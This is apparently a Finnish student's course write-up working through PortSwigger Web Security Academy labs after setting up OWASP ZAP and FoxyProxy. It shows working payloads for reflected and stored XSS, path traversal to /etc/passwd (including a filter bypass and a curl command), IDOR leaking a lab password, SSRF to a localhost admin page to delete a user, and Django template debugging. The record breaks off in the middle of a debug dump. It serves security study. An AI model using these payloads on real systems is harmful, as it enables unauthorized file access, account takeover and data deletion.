# H2 Täysin Laillinen Sertifikaatti

## x) Tiivistys
- A01:2021 – Broken Access Control
   - Broken access control oli vuoden 2021 OWASP:n kriittisin turvallisuusriski.
   - Access controllin pettäminen tyypillisesti johtaa luvattomaan tiedon paljastumiseen, muokkaamiseen tai tuhoutumiseen.
   - Yleisimpiä haavoittuvuuksia ovat mm.: vähimmän oikeuden periaatteen loukkaus, pääsynvalvonnan ohitus, IDOR, API-kutsujen pääsynvalvonnan pettäminen, oikeuksien laajennus. 
- A10:2021 – Server-Side Request Forgery (SSRF)
   - SSRF oli vuoden 2021 OWASP:n 10. kriittisin turvallisuusriski.
   - SSRF voi johtaa sisäverkkoon pääsyyn, tietovuotoihin tai muihin ulkopuolisilta rajoitettuihin asioihin pääsyyn.
   - Haavoittuvuus esiintyy, kun web-applikaatio yrittää hakea resurssia validoimatta käyttäjän antamaa URL:a.
- Insecure Direct Object References (IDOR)
   - IDOR haavoittuvuudessa hyväksikäytetään tilannetta, jossa sovellus käyttää käyttäjän antamaa syötettä hakiessaan tietoja.
   - IDOR voi johtaa tietojen vuotamiseen.
- Path traversal
   - Path traversal haavoittuvuus mahdollistaa hyökkääjälle tiedostojen lukemisen ja muokkaamisen palvelimelta.
   - Tapahtuu usein, silloin kun käyttäjän syötteitä ei validoida. 
- Server-Side Request Forgery (SSRF)
   - SSRF -haavoittuvuudessa palvelin saadaan tekemään pyyntöjä hyökkääjän haluamiin paikkoihin.
   - SSRF:n avulla voidaan päästä sisäisiin järjestelmiin tai palvelimen tekemiä pyyntöjä voidaan käyttää muutoin hyväksi. 
- Cross-Site Scripting (XSS)
   - XSS -haavoittuvuudessa hyökkääjä voi ajaa haluttua koodia muiden käyttäjien selaimissa.
   - Voidaan jakaa kolmeen tyyppiin: reflected XSS, stored XSS, DOM-based XSS. 
- Server-Side Template Injection (SSTI)
   - Haavoittuvuudessa hyökkääjä pystyy syöttämään kuormansa (payload) palvelimella oleviin pohjiin, joita lopulta ajetaan palvelimen puolelta. 
   - SSTI voi johtaa pääsyn koko infrastruktuuriin.
 
## a) Totally Legit Sertificate. Asenna OWASP ZAP, generoi CA-sertifikaatti ja asenna se selaimeesi & b) Kettumaista. Asenna "FoxyProxy Standard" Firefox Addon, ja lisää ZAP proxyksi siihen. 

Aloitin asentamalla Zaproxyn. 

```sudo apt-get update```

```sudo apt-get install zaproxy```

Tämän jälkeen ajoin Zaproxyn

```zaproxy```

<img src="https://github.com/user-attachments/assets/bac2b615-c2e8-4636-911a-231edde2f47a" width="500"> <br/>

Loin tämän jälkeen CA-sertifikaatin itselleni 

Yläpalkin valikosta ```Tools``` --> ```Options``` --> ```Network/Server Certificates```. 

Tämän jälkeen generoin uuden sertifikaatin ja tallensin sen. 

```Generate``` --> ```Save```

<img src="https://github.com/user-attachments/assets/00852da3-d93d-44eb-8336-5e6bb54d1bcb" width="500"> <br/>

Muokkasin tämän jälkeen Zaproxyn sieppaamaan myös kuvat. 

```Display``` --> ```Process images in HTTP requests/responses ✅```

<img src="https://github.com/user-attachments/assets/b1332c09-f365-42a1-bee1-59003a2e07a3" width="500"> <br/>

Tämän jälkeen avasin Firefoxin ja menin lisäämään tallennettua sertifikaattia Firefoxiin. 

Yläpalkista (saa esille painamalla ```Alt``` -näppäintä kerran) ```Settings``` --> ```Privacy & Security``` --> ```View Certificates``` --> ```Import```

<img src="https://github.com/user-attachments/assets/9acde85f-3735-47cc-9661-ca626bfe5c9d" width="500"> <br/>

Seuraavaksi asensin Firefoxiin Foxyproxy lisäosan. 

Yläpalkista ```Tools``` --> ```Add-ons and Themes``` --> ```Extensions``` --> Hakupalkkiin ```Foxyproxy``` --> ```FoxyProxy Standard``` --> ```Add to Firefox```

<img src="https://github.com/user-attachments/assets/eda6381e-bd46-417f-bd30-ab12ec0de52c" width="500"> <br/>

Ponnahdusikkunasta valitsin vielä ```Add``` ja sitä seuraavasta ```Okay```

![a6](https://github.com/user-attachments/assets/e0ffd26e-4e74-40bc-b67c-5abd2cb01f0b)

![a7](https://github.com/user-attachments/assets/16ef2c0e-f2f4-4355-baa1-65e437df2365)

Tämän jälkeen asetin vielä FoxyProxyn pikavalikkoon, jotta sen asetuksia olisi myöhemmin helpompi muokata.  

```Extensions``` --> ```Foxyproxy settings``` --> ```✅ Pin to Toolbar```

![a8](https://github.com/user-attachments/assets/63641152-2b8c-445c-bbaa-cd626b178abe)

Tämän jälkeen menin FoxyProxyn omiin asetuksiin kuvakkeesta --> ```Options``` --> ```Proxies``` ja lisäsin Zaproxylle oman proxyn ja lisäsin Proxy by patterns:iin oman verkkosivuni ```giangle.fi``` ja lopuksi ```Save```. 



```
Title: Zaproxy
Type: HTTP
Hostname: 127.0.0.1
Port: 8080
Proxy by Patterns: All | giangle.fi
```

Huom. lisäsin oman sivuni, sillä en ole tekemässä hyökkäyksiä sivulleni. Se on lisättynä vain ZaProxyn sieppauksen testaamiseksi. 

<img src="https://github.com/user-attachments/assets/77970353-996c-41ad-acda-4b85728e4bd6" width="500"> <br/>

Tämän jälkeen menin selaimella sivulleni ```giangle.fi``` ja tarkastin ZaProxysta, onko HTTP pyyntöjä siepattu. 

<img src="https://github.com/user-attachments/assets/0c1f0615-bf88-4716-96d3-14e2e3c8ff26" width="500"> <br/>

Sieppaus näyttäisi toimivan odotetusti, sillä ZaProxyyn ilmestyi GET -pyyntö. 

## c) Reflected XSS into HTML context with nothing encoded

Tehtävässä tarkoituksena saada ajettua alert funktio, alert funktiolla tyypillisesti testataankin onko sivussa XSS -haavoittuvuuksia. 

Lähdin alkuun kokeilemaan yksinkertaisinta ratkaisua eli syöttämällä yksinkertaisen skriptin hakupalkkiin. 

```<script>alert()</script>```

<img src="https://github.com/user-attachments/assets/6d280e21-8e44-4b45-9e24-f0c8922d1727" width="500"> <br/>

Painettuani ```Search``` nappulaa, ilmestyi ponnahdusikkuna näytölleni joten arvelin jo siitä onnistuin tehtävässä. 

<img src="https://github.com/user-attachments/assets/37a64e78-5124-4f70-89bc-b37fd25ddf55" width="500"> <br/>

Painettua OK ilmestyikin jo ilmoitus, että tehtävä on ratkaistu. 

<img src="https://github.com/user-attachments/assets/89bbb3c3-578c-41cd-b73f-5f7e5e3dc4aa" width="500"> <br/>

Halusin vielä selvittää missä kohtaa sivua skripti ajetaan, joten hain vielä sanalla ```testi```. 

<img src="https://github.com/user-attachments/assets/b1598b16-c73a-41f2-a954-a137bc30a852" width="500"> <br/>

Hakuun syötetty teksti ilmestyy siis sivulle ```0 search results for``` jälkeen, josta sivu lukee ja ajaa skriptin sellaisenaan. 

## d) Stored XSS into HTML context with nothing encoded

Tässä tehtävässä tarkoituksena lähettää kommentti, joka kutsuu alert -funktiota kun blogipostausta katsotaan. 

Aloitin selaamalla aloitussivua, jossa ei ollut mitään kommenttikenttää joten navigoin satunnaisesti johonkin blogipostaukseen ja selasin kommenttikenttään. 

Oletin että samalla yksinkertaisella skriptillä onnistuu tämäkin tehtävä, joten syötin kommenttikenttään skriptini ja lisäsin kommentin. 

<img src="https://github.com/user-attachments/assets/d0c0ba3a-9356-476e-bb6a-476870a7e52b" width="500"> <br/>

```
Comment: <script>alert()</script>
Name: testi
Email: test@test.com
```

<img src="https://github.com/user-attachments/assets/2f3f3526-b4c5-48ed-ad29-d5da1bb622a4" width="500"> <br/>

Lähetettyäni kommentin tulikin jo vastaus, että tehtävä on ratkaistu. Arvelin jo tässä vaiheessa, että tulevilla kerroilla ladattaessa blogisivua lähetetty skripti suoritetaan. Päätin kuitenkin vielä palata blogisivulle klikkaamalla ```< Back to blog```. 

<img src="https://github.com/user-attachments/assets/ec214285-330e-4884-b43d-fd756c1c698e" width="500"> <br/>

Skripti lähti käyntiin sivua ladattaessa. 

<img src="https://github.com/user-attachments/assets/93a5cdb7-89e6-4e4a-8896-67dbc8212fa1" width="500"> <br/>

Kommentti löytyi vielä sivulta ilman "sisältöä". Hyökkääjän kantilta olisi voinut luultavasti lisätä kommenttiin muutakin tekstiä, jolloin kommentti ei pistäisi niin paljon silmään. 


## e) File path traversal, simple case. Laita tarvittaessa Zapissa kuvien sieppaus päälle.

Tehtävässä tarkoituksena oli päästä käsiksi palvelimella olevaan ```/etc/passwd``` -tiedostoon. 

Aloitin jälleen selaamalla sivua ja miettimällä missä voisi olla hakupyyntöjä palvelimen tiedostoille. Kuvat olivat selkein kohde sivulla, joten klikkasin oikealla näppäimellä kuvaa ja painoin ```Copy Image Link```. 

<img src="https://github.com/user-attachments/assets/aa292068-f046-485b-a170-2b3df18e0974" width="500"> <br/>

```https://0a5f00ed048f7a608065adbd00a800ac.web-security-academy.net/image?filename=20.jpg```

Kopioitu linkki oli muodossa ```filename=20jpg```, joten muokkasin sen tilalle tyypillisen Path Traversal -rimpsun ```/../../../../../etc/passwd```

```https://0a5f00ed048f7a608065adbd00a800ac.web-security-academy.net/image?filename=/../../../../../etc/passwd```

Mennessäni linkkiin sain virheilmoituksen, sillä selain ei osaa lukea ```passwd``` -tiedostoa, koska sillä ei ole tiedostopäätettä. 

<img src="https://github.com/user-attachments/assets/beeb352f-c5b4-43b4-a1d2-48bbe2a57fd5" width="500"> <br/>

Palatessani sivulle, sivu ilmoitti kuitenkin tehtävän onnistuneen. 

<img src="https://github.com/user-attachments/assets/607daf34-a0c6-4c7e-847f-96c314a9d930" width="500"> <br/>

Tämän olisi voinut saada ladattua myös ZaProxylla, mutta päätin tällä kertaa ladata tiedoston vain terminaalista ```curl``` -komennolla tehtävän suorittamisen demonstroimiseksi. 

```curl https://0a5f00ed048f7a608065adbd00a800ac.web-security-academy.net/image?filename=/../../../../../etc/passwd```

<img src="https://github.com/user-attachments/assets/8c2fb1cd-269e-4c0b-bb68-04ae4ad12bfe" width="500"> <br/>

Testasin vielä mieleskiinnosta vaihtoehtoista tapaa (ilman ylimääräisiä työkaluja) saada ladattua tiedosto Firefox Developer Toolsin avulla: 

```F12``` (Firefox Developer Tools) --> ```F5``` (sivun päivitys) --> Oikea klikkaus ```GET``` pyynnöstä --> ```Save response as``` --> ```test``` (tiedoston nimi)

<img src="https://github.com/user-attachments/assets/87fee2f3-0247-4c54-b5ba-11c56ec44b6e" width="500"> <br/>

```cat test```

<img src="https://github.com/user-attachments/assets/6b6c1bf4-e280-478b-96c3-3dce87498efa" width="500"> <br/>


## f) File path traversal, traversal sequences blocked with absolute path bypass

Jälleen toinen tehtävä, jossa tavoitteena päästä ```/etc/passwd```. 

Aloitin jälleen hakemalla kuvan tiedostopolun. 

<img src="https://github.com/user-attachments/assets/63b0cd46-3304-40a8-806d-bb09cf7287b7" width="500"> <br/>

Alkuperäinen linkki. 

```https://0a02001003ffdbd882f6bf9500150053.web-security-academy.net/image?filename=37.jpg```

Kokeilin ensimmäisenä yksinkertaisinta ratkaisua.

```https://0a02001003ffdbd882f6bf9500150053.web-security-academy.net/image?filename=/../../../../../etc/passwd```

Tämä kuitenkin palautti "No such file". Joten kokeilin seuraavaksi muokata GET pyyntöä Developer Toolsin avulla. 

<img src="https://github.com/user-attachments/assets/f67676c0-373b-45eb-a3f5-6a0e7936b370" width="500"> <br/>

Tutkailin hetken GET-pyyntöä ja kokeilin erityyppisiä yhdistelmiä, jotta pääsisin ```passwd``` -tiedostoon käsiksi. 

<img src="https://github.com/user-attachments/assets/350b2cbd-a08a-49aa-9bef-def180ba438d" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/61b7376f-266a-4b7e-ac30-973c0820a884" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/3a98a549-1f83-41c6-a822-1e6a4ad4d2eb" width="500"> <br/>

Useamman epäonnistuneen yrityksen jälkeen onnistuin vihdoin saamaan GET -pyynnön läpi. Tämän jälkeen tallensin onnistuneen GET pyynnön ```Oikea klikkaus``` --> ```Save Response As``` --> ```path2``` (tiedostonimi)

<img src="https://github.com/user-attachments/assets/016afd08-c064-437c-9492-139480ebd493" width="500"> <br/>

Palasin terminaaliin avaamaan tiedoston. 

```cat path2```

<img src="https://github.com/user-attachments/assets/3f00f9dc-7adc-446c-a4df-1fdc5af14724" width="500"> <br/>

Myös sivusto ilmoitti onnistuneesta ratkaisusta. 

<img src="https://github.com/user-attachments/assets/9d5c75ed-173c-4690-a03b-7941cdeb66af" width="500"> <br/>


## g) File path traversal, traversal sequences stripped non-recursively

Tehtävässä tarkoituksena jälleen päästä käsiksi ```/etc/passwd``` -tiedostoon. 

Aloitin jälleen kopioimalla kuvan linkin. 

<img src="https://github.com/user-attachments/assets/6dd6040c-0e3c-4f52-9c31-44e73f099f02" width="500"> <br/>

```https://0a3800350499a26a8193c0a9001e00db.web-security-academy.net/image?filename=1.jpg```

Tämän jälkeen menin taas muokkaamaan GET pyyntöä ja kokeilemaan muutamaa eri vaihtoehtoa. 

<img src="https://github.com/user-attachments/assets/91e07bb4-a4b8-4323-8b80-8083055cfa19" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/30f13939-32ea-400f-a403-18261a76f5e8" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/739f34ae-324d-418e-810e-a84f8f4f8d4e" width="500"> <br/>

Tässä vaiheessa kävin kurkkaamassa vinkkiä PortsWiggerin sivuilta ja löysinkin sieltä ehdotuksen mitä kokeilla. 

<img src="https://github.com/user-attachments/assets/11162e28-b1c6-4b4e-980a-4d83cddc84e8" width="500"> <br/>

Sivusto siis karsii käynnäjän antamasta tiedostonimistä tyypillisen path traversal ```../```-osion pois, mutta sen saa kierrettyä käyttämällä ```....//```, joka on karsittuna ```../```. 

Tallensin oikean ratkaisun jälleen ```Save Response As``` --> ```path3``` (tiedostonimi)

<img src="https://github.com/user-attachments/assets/3198d781-5730-4059-9f6d-960873162e86" width="500"> <br/>

```cat path3```

<img src="https://github.com/user-attachments/assets/00f5993d-b3c7-49ef-a555-af70bc09569a" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/ebe85733-fd08-46e6-8a0f-03eff584d9ba" width="500"> <br/>



## h) Insecure direct object references

Tehtävänannossa kerrotaan, että tehtävässä chat-lokit tallennetaan suoraan palvelimeen ja ne haetaan käyttäen staattisia URL-osoitteita. Tehtävässä tavoitteena löytää käyttäjän ```carlos``` salasana ja kirjautua hänen tunnuksillaan. 

Aloitin avaamalla sivun ja menemällä ```Live chat```:iin. 

```Live chat```-sivulla näkyy ```View transcript```, joka tehtävänannon perusteella hakee palvelimelta staattisella URL-osoitteella chatlokin. Laitoin Developer Toolsin päälle ja painoin View transkriptiä, joka latasi tiedoston ```3.txt```. 

<img src="https://github.com/user-attachments/assets/4d06d4f2-f9c7-4c1f-8577-bd8acfcd420e" width="500"> <br/>

Tämän jälkeen tutkailin vielä GET-pyyntöä ja sieltä löytyi linkki. 

```https://0a5400b703f542a381a5c0f000a60024.web-security-academy.net/download-transcript/3.txt```

Oletettavasti tehtävässä pitää lukea aikaisempia lokeja, ja jos palvelimella lokin numerojärjestyksessä niin lokit ovat nimellä ```1.txt``` ja ```2.txt```. Tarkkaillaan ensin ladattua tiedostoa ja verrataan sitä nykyiseen chattiin. 

<img src="https://github.com/user-attachments/assets/43a55e92-b8c7-431a-b1ca-878f2e69270c" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/29c6ac6b-6505-45f1-8257-54e7add8946e" width="500"> <br/>

Tämän jälkeen kävin lataamassa oletetut aiemmat lokitiedostot muokkaamalla aiemmin löydettyä linkkiä. 

```https://0a5400b703f542a381a5c0f000a60024.web-security-academy.net/download-transcript/1.txt```

```https://0a5400b703f542a381a5c0f000a60024.web-security-academy.net/download-transcript/2.txt```

<img src="https://github.com/user-attachments/assets/166569d9-52a5-43ce-bc74-8641ffbe6a21" width="500"> <br/>

Sitten tarkastellaan aiempia lokitiedostoja. 

```cat 1.txt```

```cat 2.txt```

<img src="https://github.com/user-attachments/assets/2f3addd7-d75b-414c-b0a7-f6c6a8596cd9" width="500"> <br/>

Ja sieltä löytyikin carloksen salasana, jota voi kokeilla kirjautumissivulla ```My account```. 

<img src="https://github.com/user-attachments/assets/8f8e46c3-320e-45f5-a093-437b88c948c7" width="500"> <br/>

```
username: carlos
password: 6ispdmkr8770igj142iy
```

<img src="https://github.com/user-attachments/assets/cb215950-ea0f-425d-90d5-1c913429b51b" width="500"> <br/>

## i) Basic SSRF against the local server

Tehtävässä pitää saada pääsy ```http://localhost/admin``` -sivulle muuttamalla Check Stock URL pyyntöä ja poistaa käyttäjä ```carlos```. 

Kokeilin ensin mennä suoraan ```/admin``` -sivulle. 

<img src="https://github.com/user-attachments/assets/5d3acb33-fe62-4bf8-93ed-2d454990dd0d" width="500"> <br/>

Tämä ei odotetusti onnistunut, joten menin tuotesivulle tutkailemaan mitä tapahtuu Check Stockia painaessa. 

<img src="https://github.com/user-attachments/assets/c6670e4b-ae77-4ba0-acca-1f1403828fa7" width="500"> <br/>

Check Stockia painaessa muodostuu GET pyyntöjen lisäksi POST pyyntö, jota kokeilin muokata ohjaamaan minut ```/admin``` sivulle. 

<img src="https://github.com/user-attachments/assets/0b755d31-e86c-4ed1-bcaa-1ddfe997639a" width="500"> <br/>

Muutin POST -pyynnön haluttuun osoitteeseen. 

```https://0a7700c603c1eb7b80ef2be900ab00b5.web-security-academy.net/admin```

<img src="https://github.com/user-attachments/assets/6dbf320f-7d97-467e-a95c-b5d663ecaec3" width="500"> <br/>

Tämä ei antoi vastaukseksi takaisin HTTP statuskoodin 401 ([Unauthorized](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/401))

Tutkailin uudelleen POST pyyntöä vielä tarkemmin ja huomasin alla Body kohdassa linkin. 

```stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1```

<img src="https://github.com/user-attachments/assets/4038376b-c78b-421c-8e4f-73dbe6909cc5" width="500"> <br/>

Muokkasin tämän tilalle haluamani sivun eli /admin -sivun ja lähetin POST -pyynnön uudelleen. 

```stockApi=https://0a7700c603c1eb7b80ef2be900ab00b5.web-security-academy.net/admin```

<img src="https://github.com/user-attachments/assets/db2d2720-585c-4221-8eae-73f8440f0e22" width="500"> <br/>

Tämäkään ei toiminut, joten kokeilin seuraavaksi muokata tilalle 

```stockApi=http://localhost/admin```

<img src="https://github.com/user-attachments/assets/43e88579-707f-4a9c-b3d0-9d1c7fec7ffc" width="500"> <br/>

Tämä palautti onnistuneen POST pyynnön, joten avasin sen uuteen ikkunaan. 

<img src="https://github.com/user-attachments/assets/4737245c-047a-40f2-8e87-a62fee123200" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/27a98b9b-12c9-40d4-b851-f20e4e5055ac" width="500"> <br/>

Yrittäessäni poistaa käyttäjän carlos, antoi sivu kuitenkin virheen

```Admin interface only available if logged in as an administrator, or if requested from loopback```

<img src="https://github.com/user-attachments/assets/8056fc0f-e15a-456a-b468-2a1d8b966d25" width="500"> <br/>

Tästä kuitenkin sain linkin, joka toimiessaan poistaa käyttäjän ```carlos```

```https://0a7700c603c1eb7b80ef2be900ab00b5.web-security-academy.net/admin/delete?username=carlos```

Palasin tämän jälkeen POST pyyntöön ja muokkasin ```stockAPI```:n linkkiä. 

<img src="https://github.com/user-attachments/assets/9e175979-2671-4679-9a60-77dd74c81449" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/a8b5407f-a353-4fea-93c5-431f972c63dc" width="500"> <br/>

## j) Vapaaehtoinen: Server-side template injection with information disclosure via user-supplied objects

Tehtävässä tarkoituksena kirjautua sisään omilla tunnuksilla ```content-manager:C0nt3ntM4n4g3r``` ja muokata palvelimessa olevaa mallia, jotta saadaan varastettua palvelimelta secret key. 

Aloitin kirjautumalla sisään 

```My account```

```
Username: content-manager
Password: C0nt3ntM4n4g3r
```

Tämän jälkeen siirryin tuotteen sivuille muokkaamaan pohjaa: ```Edit template```

<img src="https://github.com/user-attachments/assets/e6a68c1a-5b62-4a8b-97a7-aef39d8ee9a9" width="500"> <br/>

Vertailemalla mallin koodia ja lopullista sivua, voidaan huomata että malli kutsuu palvelimelta lukuja. 

```Hurry! Only 436 left of Photobomb Backdrops at $93.70.```

```<p>Hurry! Only {{product.stock}} left of {{product.name}} at {{product.price}}.</p>```

Muokkasin mallia testataksena millä saisi mahdollisesti kutsuttua avainta. 

```
<p> {{product.key}} </p>
<p> {{testtest}} </p>
<p> {{345#¤%#¤%}} </p>
<p> {{secret.key}} </p>
```

<img src="https://github.com/user-attachments/assets/b6c2896b-2db7-402d-8c8f-a973db5f9073" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/5e70670b-1cb7-438e-8817-0ec5148252cd" width="500"> <br/>

Painoin save, enkä preview joten kyseinen sivu hajosi eikä sinne pääse enää takaisin. Onnekseni sivu antoi kuitenkin virhekoodin, josta selviää että kyseessä on django. 

```</usr/local/lib/python2.7/dist-packages/django/template/base.py```

Tässä vaiheessa jäin jumiin enkä keksinyt ratkaisua päästä eteenpäin ja kävin kurkkaamassa vinkkiä PortSwiggeristä päästäkseni eteenpäin. Siitä selvisi, että ```{% debug %}``` -komenolla saa djangossa aktivoitua sisäänrakennetun debuggerin joten lisäsin sen malliin. 

```{% debug %}```

<img src="https://github.com/user-attachments/assets/3c3b4200-72c7-4e8d-aaf9-4e2f4ba791aa" width="500"> <br/>

Painaessani Preview (jottei sivu menisi taas täysin rikki jos tämä ei toimikaan), sain alle listan komennoista ja moduuleista. 

```
{'product': {'name': 'Sarcastic 9 Ball', 'price': '$30.80', 'stock': 785}, 'settings': <LazySettings "None">}{'False': False, 'None': None, 'True': True} {'Cookie': <module 'Cookie' from '/usr/lib/python2.7/Cookie.pyc'>, 'HTMLParser': <module 'HTMLParser' from '/usr/lib/python2.7/HTMLParser.pyc'>, 'SocketServer': <module 'SocketServer' from '/usr/lib/python2.7/SocketServer.pyc'>, 'StringIO': <module 'StringIO' from '/usr/lib/python2.7/StringIO.pyc'>, 'UserDict': <module 'UserDict' from '/usr/lib/python2.7/UserDict.pyc'>, 'UserList': <module 'UserList' from '/usr/lib/python2.7/UserList.pyc'>, '__builtin__': <module '__builtin__' (built-in)>, '__future__': <module '__future__' from '/usr/lib/python2.7/__future__.pyc'>, '__main__': <module '__main__' (built-in)>, '_abcoll': <module '_abcoll' from '/usr/lib/python2.7/_abcoll.pyc'>, '_ast': <module '_ast' (built-in)>, '_bisect': <module '_bisect' (built-in)>, '_codecs': <module '_codecs' (built-in)>, '_collections': <module '_collections' (built-in)>, '_ctypes': <module '_ctypes' from '/usr/lib/python2.7/lib-dynload/_ctypes.x86_64-linux-gnu.so'>, '_functools': <module '_functools' (built-in)>, '_hashlib': <module '_hashlib' from '/usr/lib/python2.7/lib-dynload/_hashlib.x86_64-linux-gnu.so'>, '_heapq': <module '_heapq' (built-in)>, '_io': <module '_io' (built-in)>, '_json': <module '_json' from '/usr/lib/python2.7/lib-dynload/_json.x86_64-linux-gnu.so'>, '_locale': <module '_locale' (built-in)>, '_random': <module '_random' (built-in)>, '_socket': <module '_socket' (built-in)>, '_sre': <module '_sre' (built-in)>, '_ssl': <module '_ssl' from '/usr/lib/python2.7/lib-dynload/_ssl.x86_64-linux-gnu.so'>, '_struct': <module '_struct' (built-in)>, '_sysconfigdata': <module '_sysconfigdata' from '/usr/lib/python2.7/_sysconfigdata.pyc'>, '_sysconfigdata_nd': <module '_sysconfigdata_nd' from '/usr/lib/python2.7/plat-x86_64-linux-gnu/_sysconfigdata_nd.pyc'>, '_warnings': <module '_warnings' (built-in)>, '_weakref': <module '_weakref' (built-in)>, '_weakrefset': <module '_weakrefset' from '/usr/lib/python2.7/_weakrefset.pyc'>, 'abc': <module 'abc' from '/usr/lib/python2.7/abc.pyc'>, 'argparse': <module 'argparse' from '/usr/lib/python2.7/argparse.pyc'>, 'array': <module 'array' (built-in)>, 'ast': <module 'ast' from '/usr/lib/python2.7/ast.pyc'>, 'atexit': <module 'atexit' from '/usr/lib/python2.7/atexit.pyc'>, 'base64': <module 'base64' from '/usr/lib/python2.7/base64.pyc'>, 'binascii': <module 'binascii' (built-in)>, 'bisect': <module 'bisect' from '/usr/lib/python2.7/bisect.pyc'>, 'bz2': <module 'bz2' from '/usr/lib/python2.7/lib-dynload/bz2.x86_64-linux-gnu.so'>, 'cPickle': <module 'cPickle' (built-in)>, 'cStringIO': <module 'cStringIO' (built-in)>, 'calendar': <module 'calendar' from '/usr/lib/python2.7/calendar.pyc'>, 'cgi': <module 'cgi' from '/usr/lib/python2.7/cgi.pyc'>, 'codecs': <module 'codecs' from '/usr/lib/python2.7/codecs.pyc'>, 'collections': <module 'collections' from '/usr/lib/python2.7/collections.pyc'>, 'contextlib': <module 'contextlib' from '/usr/lib/python2.7/contextlib.pyc'>, 'copy': <module 'copy' from '/usr/lib/python2.7/copy.pyc'>, 'copy_reg': <module 'copy_reg' from '/usr/lib/python2.7/copy_reg.pyc'>, 'ctypes': <module 'ctypes' from '/usr/lib/python2.7/ctypes/__init__.pyc'>, 'ctypes._ctypes': None, 'ctypes._endian': <module 'ctypes._endian' from '/usr/lib/python2.7/ctypes/_endian.pyc'>, 'ctypes.ctypes': None, 'ctypes.errno': None, 'ctypes.os': None, 'ctypes.re': None, 'ctypes.struct': None, 'ctypes.subprocess': None, 'ctypes.sys': None, 'ctypes.tempfile': None, 'ctypes.util': <module 'ctypes.util' from '/usr/lib/python2.7/ctypes/util.pyc'>, 'datetime': <module 'datetime' (built-in)>, 'decimal': <module 'decimal' from '/usr/lib/python2.7/decimal.pyc'>, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>, 'django': <module 'django' from '/usr/local/lib/python2.7/dist-packages/django/__init__.pyc'>, 'django.__future__': None, 'django.apps': <module 'django.apps' from '/usr/local/lib/python2.7/dist-packages/django/apps/__init__.pyc'>, 'django.apps.collections': None, 'django.apps.config': <module 'django.apps.config' from '/usr/local/lib/python2.7/dist-packages/django/apps/config.pyc'>, 'django.apps.django': None, 'django.apps.functools': None, 'django.apps.importlib': None, 'django.apps.os': None, 'django.apps.registry': <module 'django.apps.registry' from '/usr/local/lib/python2.7/dist-packages/django/apps/registry.pyc'>, 'django.apps.sys': None, 'django.apps.threading': None, 'django.apps.warnings': None, 'django.conf': <module 'django.conf' from '/usr/local/lib/python2.7/dist-packages/django/conf/__init__.pyc'>, 'django.conf.__future__': None, 'django.conf.django': None, 'django.conf.global_settings': <module 'django.conf.global_settings' from '/usr/local/lib/python2.7/dist-packages/django/conf/global_settings.pyc'>, 'django.conf.importlib': None, 'django.conf.os': None, 'django.conf.time': None, 'django.core': <module 'django.core' from '/usr/local/lib/python2.7/dist-packages/django/core/__init__.pyc'>, 'django.core.__future__': None, 'django.core.base64': None, 'django.core.cache': <module 'django.core.cache' from '/usr/local/lib/python2.7/dist-packages/django/core/cache/__init__.pyc'>, 'django.core.cache.__future__': None, 'django.core.cache.backends': <module 'django.core.cache.backends' from '/usr/local/lib/python2.7/dist-packages/django/core/cache/backends/__init__.pyc'>, 'django.core.cache.backends.__future__': None, 'django.core.cache.backends.base': <module 'django.core.cache.backends.base' from '/usr/local/lib/python2.7/dist-packages/django/core/cache/backends/base.pyc'>, 'django.core.cache.backends.django': None, 'django.core.cache.backends.time': None, 'django.core.cache.backends.warnings': None, 'django.core.cache.django': None, 'django.core.cache.hashlib': None, 'django.core.cache.threading': None, 'django.core.cache.utils': <module 'django.core.cache.utils' from '/usr/local/lib/python2.7/dist-packages/django/core/cache/utils.pyc'>, 'django.core.checks': <module 'django.core.checks' from '/usr/local/lib/python2.7/dist-packages/django/core/checks/__init__.pyc'>, 'django.core.checks.__future__': None, 'django.core.checks.caches': <module 'django.core.checks.caches' from '/usr/local/lib/python2.7/dist-packages/django/core/checks/caches.pyc'>, 'django.core.checks.collections': None, 'django.core.checks.compatibility': <module 'django.core.checks.compatibility' from '/usr/local/lib/python2.7/dist-packages/django/core/checks/compatibility/__init__.pyc'>, 'django.core.checks.compatibility.__future__': None, 'django.core.checks.compatibility.django': None, 'django.core.checks.compatibility.django_1_10': <module 'django.core.checks.compatibility.django_1_10' from '/usr/local/lib/python2.7/dist-packages/django/core/checks/compatibility/django_1_10.pyc'>, 'django.core.checks.compatibility.django_1_8_0': <module 'django.core.checks.compatibility.django_1_8_0' from '/usr/local/lib/python2.7/dist-packages/django/core/checks/compatibility/django_1_8_0.pyc'>, 'django.core.checks.copy': None, 'django.core.checks.database': <module 'django.core.checks.database' from '/usr/local/lib/python2.7/dist-packages/django/core/checks/database.pyc'>, 'django.core.checks.django': None, 'django.core.checks.inspect': None, 'django.core.checks.itertools': None, 'django.core.checks.messages': <module 'django.core.checks.messages' from '/usr/local/lib/python2.7/dist-packages/django/core/checks/messages.pyc'>, 'django.core.checks.model_checks': <module 'django.core.checks.model_checks' from '/usr/local/lib/python2.7/dist-packages/django/core/checks/model_checks.pyc'>, 'django.core.checks.registry': <module 'django.core.checks.registry' from '/usr/local/lib/python2.7/dist-packages/django/core/checks/registry.pyc'>, 'django.core.checks.security': <module 'django.core.checks.security' from '/usr/local/lib/python2.7/dist-packages/django/core/checks/security/__init__.pyc'>, 'django.core.checks.security.base': <module 'django.core.checks.security.base' from '/usr/local/lib/python2.7/dist-packages/django/core/checks/security/base.pyc'>, 'django.core.checks.security.csrf': <module 'django.core.checks.security.csrf' from '/usr/local/lib/python2.7/dist-packages/django/core/checks/security/csrf.pyc'>, 'django.core.checks.security.django': None, 'django.core.checks.security.sessions': <module 'django.core.checks.security.sessions' from '/usr/local/lib/python2.7/dist-packages/django/core/checks/security/sessions.pyc'>, 'django.core.checks.templates': <module 'django.core.checks.templates' from '/usr/local/lib/python2.7/dist-packages/django/core/checks/templates.pyc'>, 'django.core.checks.types': None, 'django.core.checks.urls': <module 'django.core.checks.urls' from 